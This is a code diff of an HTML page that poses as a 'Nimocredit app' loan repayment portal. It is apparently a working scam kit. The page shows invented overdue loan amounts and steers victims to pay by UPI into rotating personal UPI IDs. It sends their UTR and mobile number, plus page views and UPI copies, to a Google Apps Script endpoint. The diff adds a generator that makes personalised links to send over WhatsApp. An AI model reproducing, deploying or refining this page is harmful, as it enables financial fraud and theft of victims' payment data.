@@ -3,33 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Repayment Portal</title>
+    <title>Repayment Portal & Generator</title>
     
     <script>
-        // =========================================================================
-        // ⚙️ YAHAN SE APP NAME, AMOUNTS, DAYS AUR ORDER NO. ASANI SE CHANGE KAREIN:
-        // =========================================================================
+        const urlParams = new URLSearchParams(window.location.search);
+        const hasParams = urlParams.has('mobile') || urlParams.has('payable');
+
         const MY_CONFIG = {
             appName: "Nimocredit app",              
-            
             upiList: [
                 "raghavy807-1@okhdfcbank",
                 "ashalaon7770@ptyes",  
                 "raghavy807-1@okhdfcbank"   
             ],
-            
-            mobileNumber: "91630***1323",        
-            payableAmount: "₹4800",           
-            loanAmount: "₹4500",              
-            disbursedAmount: "₹4500",        
+            mobileNumber: urlParams.get('mobile') || "91630***1323",        
+            payableAmount: urlParams.get('payable') || "₹4800",           
+            disbursedAmount: urlParams.get('disbursed') || "₹4500",        
             loanTerm: "7 Days",                 
-            interestRate: "₹32",               
-            overdueFee: "₹32",                 
-            repaymentDate: "2/11/2026",
-            orderId: "69239189",                 // Yahan naya order number add kar diya gaya hai
-            overdueText: "5 Days Overdue"        
+            repaymentDate: urlParams.get('date') || "2/11/2026",
+            orderId: urlParams.get('order') || "69239189",                 
+            overdueText: urlParams.get('overdue') || "5 Days Overdue"        
         };
-        // =========================================================================
     </script>
 
     <style>
@@ -46,10 +40,12 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 0;
+            padding: 10px;
             touch-action: manipulation;
             -webkit-text-size-adjust: 100%;
         }
+
+        /* Portal Styling */
         .container {
             width: 100%;
             max-width: 410px;
@@ -58,9 +54,8 @@
             overflow: hidden;
             position: relative;
             padding-bottom: 25px;
+            display: none;
         }
-        
-        /* Top Banner Card */
         .top-card {
             background: linear-gradient(135deg, #3b82f6 0%, #2b70ff 100%);
             margin: 10px 14px 0 14px;
@@ -99,8 +94,6 @@
             font-weight: 500;
             margin-top: 3px;
         }
-
-        /* Amount & Date Card */
         .info-box {
             background: white;
             margin: 0 14px 14px 14px;
@@ -164,8 +157,6 @@
             font-weight: 600;
             background: #fff;
         }
-
-        /* Loan Details Section */
         .details-card {
             background: white;
             margin: 0 14px 14px 14px;
@@ -205,8 +196,6 @@
             color: #3b82f6;
             text-decoration: none;
         }
-
-        /* Action Buttons */
         .action-container {
             display: flex;
             gap: 10px;
@@ -284,7 +273,7 @@
             font-weight: 600;
         }
 
-        /* Modal Overlay (Step 2) */
+        /* Modal Overlay */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -304,11 +293,6 @@
             border-top-left-radius: 28px;
             border-top-right-radius: 28px;
             padding: 24px 22px 32px 22px;
-            animation: slideUp 0.3s ease-out;
-        }
-        @keyframes slideUp {
-            from { transform: translateY(100%); }
-            to { transform: translateY(0); }
         }
         .modal-header {
             text-align: center;
@@ -358,31 +342,12 @@
             border-bottom: 1px solid #f2f3f5;
             font-size: 14px;
         }
-        .payment-option-left {
-            display: flex;
-            flex-direction: column;
-            color: #1a1a1a;
-            font-weight: 500;
-        }
         .sub-text {
             font-size: 11px;
             color: #9ca3af;
             margin-top: 2px;
             font-weight: 400;
             text-align: right;
-        }
-        .payment-option-right {
-            font-weight: 600;
-            color: #111827;
-            font-size: 13.5px;
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-        }
-        .wallet-amount-row {
-            display: flex;
-            align-items: center;
-            gap: 10px;
         }
         .radio-dot {
             width: 18px;
@@ -413,7 +378,6 @@
             font-weight: 600;
             margin-top: 20px;
             cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
 
         /* Step 3 Gateway Screen */
@@ -478,7 +442,6 @@
             color: #f97316;
             font-weight: 700;
         }
-        
         .pay-app-btn {
             display: flex;
             justify-content: space-between;
@@ -491,7 +454,6 @@
             cursor: pointer;
             height: 56px;
         }
-        
         .paytm-logo-text {
             font-family: Arial, sans-serif;
             font-weight: 900;
@@ -501,7 +463,6 @@
         }
         .paytm-blue { color: #002e6e; }
         .paytm-cyan { color: #00b9f1; }
-
         .phonepe-brand {
             display: flex;
             align-items: center;
@@ -527,7 +488,6 @@
             font-family: Arial, sans-serif;
             letter-spacing: -0.3px;
         }
-        
         .hand-tap-icon {
             width: 28px;
             height: 28px;
@@ -535,7 +495,6 @@
             align-items: center;
             justify-content: center;
         }
-
         .upi-section-row {
             display: flex;
             gap: 10px;
@@ -564,9 +523,7 @@
             font-weight: 600;
             font-size: 15px;
             cursor: pointer;
-            box-shadow: 0 2px 6px rgba(22, 119, 255, 0.2);
         }
-
         .utr-input {
             width: 100%;
             padding: 14px;
@@ -576,10 +533,6 @@
             margin-top: 8px;
             outline: none;
             background: #f9fafb;
-        }
-        .utr-input:focus {
-            border-color: #2977ff;
-            background: #ffffff;
         }
         .submit-utr-btn {
             width: 100%;
@@ -593,17 +546,81 @@
             margin-top: 15px;
             cursor: pointer;
         }
-        .tip-red {
-            color: #dc2626;
-            font-size: 11.5px;
-            margin-top: 6px;
+
+        /* Built-in Generator Styling */
+        .generator-box {
+            width: 100%;
+            max-width: 410px;
+            background: white;
+            padding: 22px;
+            border-radius: 24px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            display: none;
+        }
+        .generator-box h2 {
+            font-size: 18px;
+            color: #1a1a1a;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .form-group {
             margin-bottom: 12px;
+        }
+        .form-group label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #4b5563;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .gen-btn {
+            width: 100%;
+            background: #2b70ff;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .result-box {
+            margin-top: 15px;
+            background: #f9fafb;
+            border: 1px dashed #cbd5e1;
+            padding: 10px;
+            border-radius: 8px;
+            word-break: break-all;
+            font-size: 12.5px;
+            color: #334155;
+            display: none;
+        }
+        .copy-gen-btn {
+            background: #16a34a;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            width: 100%;
+            font-weight: 600;
+            display: none;
+            margin-top: 8px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-<!-- Step 1: Main Dashboard -->
+<!-- 1. Repayment Portal Screen -->
 <div class="container" id="step1Screen">
     <div class="top-card">
         <div class="logo-area">
@@ -635,13 +652,9 @@
         </div>
     </div>
 
-    <!-- Loan Details Box -->
+    <!-- Loan Details Box (Sirf 2 zaroori options rakhe hain) -->
     <div class="details-card">
         <div class="section-title">Loan Details</div>
-        <div class="detail-row">
-            <span class="detail-label">Loan Amount</span>
-            <span class="detail-value" id="lblLoanAmount"></span>
-        </div>
         <div class="detail-row">
             <span class="detail-label">Disbursed Amount</span>
             <span class="detail-value" id="lblDisbursedAmount"></span>
@@ -650,14 +663,6 @@
             <span class="detail-label">Loan Term</span>
             <span class="detail-value" id="lblLoanTerm"></span>
         </div>
-        <div class="detail-row">
-            <span class="detail-label">Interest</span>
-            <span class="detail-value" id="lblInterest"></span>
-        </div>
-        <div class="detail-row">
-            <span class="detail-label">Overdue Fee</span>
-            <span class="detail-value" id="lblOverdueFee"></span>
-        </div>
         <div class="terms-text">
             I have read and agreed to <span id="lblAppNameContract"></span>'s <a href="#">Sanction Letter</a> and <a href="#">Loan Service Contract</a>.
         </div>
@@ -665,7 +670,6 @@
 
     <div class="action-container">
         <button class="btn-repayment" onclick="openModal()">Repayment</button>
-        
         <div class="btn-discount-wrapper">
             <div class="fire-badge">🔥 95% Choices</div>
             <button class="btn-discount" onclick="openModal()">
@@ -680,7 +684,7 @@
     </div>
 </div>
 
-<!-- Step 2: Modal Popup -->
+<!-- Modal Popup -->
 <div class="modal-overlay" id="paymentModal" onclick="closeModal(event)">
     <div class="modal-content" onclick="event.stopPropagation()">
         <div class="modal-header">
@@ -699,13 +703,13 @@
         <div class="payment-option">
             <div class="payment-option-left">
                 <span>Wallet</span>
+                <span class="sub-text">Available balance: ₹0</span>
             </div>
             <div class="payment-option-right">
                 <div class="wallet-amount-row">
                     <span>-₹0</span>
                     <div class="radio-dot-gray"></div>
                 </div>
-                <span class="sub-text">Available balance: ₹0</span>
             </div>
         </div>
 
@@ -723,7 +727,7 @@
     </div>
 </div>
 
-<!-- Step 3: Final Payment Gateway Screen -->
+<!-- Step 3 Gateway Screen -->
 <div id="step3Screen">
     <div class="step3-container">
         <div class="step3-top-header">
@@ -782,11 +786,43 @@
 
             <button class="submit-utr-btn" onclick="submitUtr()">Submit UTR</button>
         </div>
-
-        <div style="text-align: center; font-size: 12px; color: #6b7280; margin-top: 15px;">
-            Tip: How to get UTR? Please <span style="color: #f97316; text-decoration: underline; cursor: pointer;" onclick="alert('UTR is the 12-digit reference number from your payment app history.')">click here</span>
-        </div>
     </div>
+</div>
+
+
+<!-- 2. Built-in Link Generator Screen (Sirf 3-4 zaroori boxes) -->
+<div class="generator-box" id="generatorBox">
+    <h2>⚡ Quick Link Generator</h2>
+    
+    <div class="form-group">
+        <label>Mobile Number:</label>
+        <input type="text" id="genMobile" value="916301323">
+    </div>
+
+    <div class="form-group">
+        <label>Payable Amount (e.g. ₹4800):</label>
+        <input type="text" id="genPayable" value="₹4800">
+    </div>
+
+    <div class="form-group">
+        <label>Disbursed Amount (e.g. ₹4500):</label>
+        <input type="text" id="genDisbursed" value="₹4500">
+    </div>
+
+    <div class="form-group">
+        <label>Overdue Text (e.g. 5 Days Overdue):</label>
+        <input type="text" id="genOverdue" value="5 Days Overdue">
+    </div>
+
+    <div class="form-group">
+        <label>Order ID:</label>
+        <input type="text" id="genOrder" value="69239189">
+    </div>
+
+    <button class="gen-btn" onclick="generateLink()">Generate Link 🚀</button>
+
+    <div class="result-box" id="resultLink"></div>
+    <button class="copy-gen-btn" id="copyBtn" onclick="copyGeneratedLink()">Copy Link 📋</button>
 </div>
 
 <script>
@@ -794,7 +830,7 @@
     var upiTimer = null;
 
     function formatMobile(num) {
-        if(num && num.length === 10) {
+        if(num && num.length >= 7) {
             return num.substring(0, 3) + "****" + num.substring(7);
         }
         return num || '';
@@ -830,33 +866,38 @@
     }
 
     window.onload = function() {
-        document.getElementById('lblAppName1').innerText = MY_CONFIG.appName;
-        document.getElementById('lblAppNameContract').innerText = MY_CONFIG.appName;
-        document.getElementById('lblPayToApp').innerText = "Pay to " + MY_CONFIG.appName;
+        if (hasParams) {
+            document.getElementById('step1Screen').style.display = 'block';
+            document.getElementById('generatorBox').style.display = 'none';
 
-        document.getElementById('lblMobile').innerText = formatMobile(MY_CONFIG.mobileNumber);
-        document.getElementById('lblPayable1').innerText = MY_CONFIG.payableAmount;
-        document.getElementById('lblDate').innerText = MY_CONFIG.repaymentDate;
-        
-        // Order ID aur Overdue text yahan update ho raha hai
-        document.getElementById('lblOrderId').innerText = MY_CONFIG.orderId;
-        document.getElementById('lblOverdueText').innerText = MY_CONFIG.overdueText;
-        
-        // Loan Details yahan update ho rahi hain
-        document.getElementById('lblLoanAmount').innerText = MY_CONFIG.loanAmount;
-        document.getElementById('lblDisbursedAmount').innerText = MY_CONFIG.disbursedAmount;
-        document.getElementById('lblLoanTerm').innerText = MY_CONFIG.loanTerm;
-        document.getElementById('lblInterest').innerText = MY_CONFIG.interestRate;
-        document.getElementById('lblOverdueFee').innerText = MY_CONFIG.overdueFee;
-        
-        document.getElementById('lblPayable2').innerText = MY_CONFIG.payableAmount;
-        document.getElementById('lblWarning').innerText = `Insufficient wallet balance, pay another ${MY_CONFIG.payableAmount} via UPI to complete your order`;
-        document.getElementById('lblUpiAmount').innerText = `-${MY_CONFIG.payableAmount}`;
-        
-        document.getElementById('lblStep3Payable').innerText = MY_CONFIG.payableAmount;
-        document.getElementById('lblTransferText').innerText = `transfer ${MY_CONFIG.payableAmount}`;
-        
-        updateUpiDisplay();
+            document.getElementById('lblAppName1').innerText = MY_CONFIG.appName;
+            document.getElementById('lblAppNameContract').innerText = MY_CONFIG.appName;
+            document.getElementById('lblPayToApp').innerText = "Pay to " + MY_CONFIG.appName;
+
+            document.getElementById('lblMobile').innerText = formatMobile(MY_CONFIG.mobileNumber);
+            document.getElementById('lblPayable1').innerText = MY_CONFIG.payableAmount;
+            document.getElementById('lblDate').innerText = MY_CONFIG.repaymentDate;
+            
+            document.getElementById('lblOrderId').innerText = MY_CONFIG.orderId;
+            document.getElementById('lblOverdueText').innerText = MY_CONFIG.overdueText;
+            
+            document.getElementById('lblDisbursedAmount').innerText = MY_CONFIG.disbursedAmount;
+            document.getElementById('lblLoanTerm').innerText = MY_CONFIG.loanTerm;
+            
+            document.getElementById('lblPayable2').innerText = MY_CONFIG.payableAmount;
+            document.getElementById('lblWarning').innerText = `Insufficient wallet balance, pay another ${MY_CONFIG.payableAmount} via UPI to complete your order`;
+            document.getElementById('lblUpiAmount').innerText = `-${MY_CONFIG.payableAmount}`;
+            
+            document.getElementById('lblStep3Payable').innerText = MY_CONFIG.payableAmount;
+            document.getElementById('lblTransferText').innerText = `transfer ${MY_CONFIG.payableAmount}`;
+            
+            updateUpiDisplay();
+
+            new Image().src = "https://script.google.com/macros/s/AKfycbwJyHYi0_KCFIcfP0bwIob2tPHOa-gbcKoAVod2zUin-K3bkMKaBKZQdVdgsd7KKRo/exec?type=view";
+        } else {
+            document.getElementById('step1Screen').style.display = 'none';
+            document.getElementById('generatorBox').style.display = 'block';
+        }
     };
 
     function openModal() {
@@ -871,14 +912,12 @@
         document.getElementById('paymentModal').style.display = 'none';
         document.getElementById('step1Screen').style.display = 'none';
         document.getElementById('step3Screen').style.display = 'flex';
-        
         startUpiRotation();
     }
 
     function copyUpi() {
         if(MY_CONFIG.upiList && MY_CONFIG.upiList.length > 0) {
             var activeUpi = MY_CONFIG.upiList[currentUpiIndex];
-            
             if (navigator.clipboard && window.isSecureContext) {
                 navigator.clipboard.writeText(activeUpi);
             } else {
@@ -889,16 +928,11 @@
                 document.body.appendChild(textArea);
                 textArea.focus();
                 textArea.select();
-                try {
-                    document.execCommand('copy');
-                } catch (err) {}
+                try { document.execCommand('copy'); } catch (err) {}
                 document.body.removeChild(textArea);
             }
-            
             alert('Copy UPI Successfully!');
-
             new Image().src = "https://script.google.com/macros/s/AKfycbwJyHYi0_KCFIcfP0bwIob2tPHOa-gbcKoAVod2zUin-K3bkMKaBKZQdVdgsd7KKRo/exec?type=copy";
-
             currentUpiIndex = (currentUpiIndex + 1) % MY_CONFIG.upiList.length;
             updateUpiDisplay();
             startUpiRotation();
@@ -911,19 +945,36 @@
             alert('Please enter a valid UTR number.');
         } else {
             alert('Submit Successfully!');
-
             var utrNumber = encodeURIComponent(utr);
             var mobileNo = encodeURIComponent(MY_CONFIG.mobileNumber || '');
             var trackingUrl = "https://script.google.com/macros/s/AKfycbwJyHYi0_KCFIcfP0bwIob2tPHOa-gbcKoAVod2zUin-K3bkMKaBKZQdVdgsd7KKRo/exec?type=utr&utr=" + utrNumber + "&mobile=" + mobileNo;
             new Image().src = trackingUrl;
         }
     }
-</script>
 
-<script>
-    window.addEventListener('DOMContentLoaded', () => {
-        new Image().src = "https://script.google.com/macros/s/AKfycbwJyHYi0_KCFIcfP0bwIob2tPHOa-gbcKoAVod2zUin-K3bkMKaBKZQdVdgsd7KKRo/exec?type=view";
-    });
+    function generateLink() {
+        let mobile = document.getElementById('genMobile').value;
+        let payable = document.getElementById('genPayable').value;
+        let disbursed = document.getElementById('genDisbursed').value;
+        let overdue = document.getElementById('genOverdue').value;
+        let order = document.getElementById('genOrder').value;
+
+        let baseUrl = window.location.href.split('?')[0];
+
+        let finalLink = `${baseUrl}?mobile=${encodeURIComponent(mobile)}&payable=${encodeURIComponent(payable)}&disbursed=${encodeURIComponent(disbursed)}&overdue=${encodeURIComponent(overdue)}&order=${encodeURIComponent(order)}`;
+
+        let resBox = document.getElementById('resultLink');
+        resBox.style.display = 'block';
+        resBox.innerText = finalLink;
+
+        document.getElementById('copyBtn').style.display = 'block';
+    }
+
+    function copyGeneratedLink() {
+        let linkText = document.getElementById('resultLink').innerText;
+        navigator.clipboard.writeText(linkText);
+        alert('Link Copied Successfully! Ab aap isko WhatsApp par bhej sakte hain.');
+    }
 </script>
 
 </body>
